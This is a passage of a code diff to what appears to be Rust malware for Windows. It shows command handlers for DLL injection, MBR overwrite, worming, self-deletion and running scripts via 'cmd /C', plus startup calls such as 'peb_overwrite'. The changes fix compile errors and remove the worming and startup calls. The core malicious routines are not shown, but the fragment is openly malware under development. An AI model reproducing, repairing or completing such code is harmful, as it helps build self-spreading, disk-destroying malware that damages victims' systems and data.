@@ -66,13 +66,13 @@ fn handle_dll_injection(){
                         .nth(2)
                         .unwrap()
                         .to_string();
-    inject_dll(process_name, dllName);
+    inject_dll(&process_name, &dll_name);
 }
 fn handle_mbr_overwrite(){
 
 }
 fn handle_worming(){
-    start_worming();
+
 }
 
 fn handle_self_delete(){
@@ -92,7 +92,7 @@ fn handle_scripts(){
     match script_name.split('.').nth(1).unwrap(){
         "rs" =>{
             let output = Command::new("cmd")
-            .args(&["/C",format!("rustc {}",script_name.split('.').nth(0).unwrap().to_string()) as &str])
+            .args(&["/C",&format!("rustc {}",script_name.split('.').nth(0).unwrap().to_string())])
             .output()
             .expect("Error running the script");
         },
@@ -104,7 +104,7 @@ fn handle_scripts(){
         },
         "cs" => {
             let output = Command::new("cmd")
-            .args(&["/C",format!("csi {}",script_name.split('.').nth(0).unwrap().to_string()) as &str])
+            .args(&["/C",&format!("csi {}",script_name.split('.').nth(0).unwrap().to_string()) as &str])
             .output()
             .expect("Error running the script");
         },
@@ -168,9 +168,7 @@ fn main(){
     );
 
     //Work area
-    check();
-    peb_overwrite();
-    set_policy();
+   
     
 
 
